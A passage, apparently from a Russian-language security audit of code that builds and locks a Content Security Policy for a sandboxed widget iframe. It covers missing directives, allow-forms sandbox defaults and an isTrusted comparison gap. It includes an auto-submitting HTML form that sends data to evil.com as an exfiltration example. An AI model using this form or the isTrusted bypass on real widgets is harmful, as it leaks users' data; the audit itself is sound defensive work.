он не запустится. Архитектурное решение.

### 2. `'unsafe-inline'` в `style-src`

CSS-инъекция возможна, но ограничена (нет `expression()` в современных
браузерах).

### 3. `frame-src 'none'` по умолчанию — хорошо

Но если хост передаст `frameDomains: ["*"]` — откроется всё.

**Проверка `M()`:** `w(["a.com"], ["*"])` → `!s && r` → `"less"` → throw.
**Правильно.**

### 4. `img-src data:` всегда

```
img-src 'self' data: <43 домена>
```

`data:` в `img-src` — стандартно и относительно безопасно.

### 5. Отсутствие `form-action`

Реальный вектор: виджет делает
```html
<form action="https://evil.com/collect" method="POST">
  <input name="data" value="...">
</form>
<script>document.forms[0].submit()</script>
```

**CSP не заблокирует** — `form-action` не задан. **Но** `connect-src`
не покрывает form-submit, так что это реальная дыра утечки данных.

**Компенсация:** `sandbox="allow-forms"` в iframe. Без `allow-forms` форма
не отправится. Смотрим `run-user-code` → `html`-ветка → `Dr()`:

```js
r.sandbox = allowPopups === false
  ? "allow-scripts allow-same-origin"
  : "allow-scripts allow-same-origin allow-popups allow-popups-to-escape-sandbox allow-forms"
```

**По умолчанию `allowPopups = true`** → `allow-forms` **есть**. Значит
форма отправится.

**Итог: утечка через `<form>` возможна.**

---

# ЧАСТЬ 9. Итог

## 9.1 Что делает файл

1. **Строит** CSP-политику из конфига (`q`)
2. **Сравнивает** с предыдущей (`M`, `w`, `g`, `z`)
3. **Запрещает** ослабление (`N` → throw)
4. **Применяет** через `<meta>` в `<head>`

## 9.2 Ключевые числа

| Что | Значение |
|---|---|
| Azure Blob доменов | 35 |
| Базовых доменов всего | 43 |
| Разрешённых протоколов | 3 (`https:`, `http:`, `wss:`) |
| Особых протоколов (`isTrusted`) | 2 (`blob:`, `data:`) |
| Директив CSP | 14 |
| Отсутствующих директив | `form-action`, `trusted-types`, `sandbox`, `report-uri` |
| Глобальных переменных | 2 (`$`, `m`) |

## 9.3 Главные находки

**1. Ослабление невозможно — архитектурно.**

`M()` возвращает `"less"` при любом ослаблении, `N()` бросает. Нельзя
добавить домен, нельзя выключить `disableNetworkRequests`.

**2. Несравнимые списки считаются ослаблением.**

`["a.com"] → ["b.com"]` → `"less"` → throw. Заменить домен нельзя, только
добавить или убрать.

**3. `isTrusted` не входит в сравнение `M()`.**

```js
M({...}, {...}) // isTrusted не проверяется
```

Значит `N()` пропустит переход `isTrusted: false → true`. Это даёт
возможность добавить `blob:`/`data:` в `script-src`.

**4. `disableNetworkRequests` ужесточает дважды.**

```
default-src 'none'  (вместо 'self')
script-src https://origin/assets/  (вместо 'self')
```

Второе — важное: `'self'` разрешает весь origin, `/assets/` — только бандлы.

**5. `form-action` отсутствует — утечка через `<form>` возможна.**

Плюс `sandbox` содержит `allow-forms` по умолчанию (`allowPopups = true`).

**6. `'unsafe-inline'` + `'unsafe-eval'` + `blob:` в `script-src`.**

CSP защищает от **внешних** скриптов, но не от инлайн-кода. Это неизбежно
для песочницы, исполняющей пользовательский код.

**7. `imageDomains` нормализуются всегда, `resourceDomains` — нет при `isTrusted`.**

Асимметрия в коде: `d(o)` без `i`, `d(n, i)` с `i`.

**8. Один `$` и `m` на модуль.**

Если два виджета применяют разные политики — второй не сможет ослабить
первый, даже если это другой iframe.
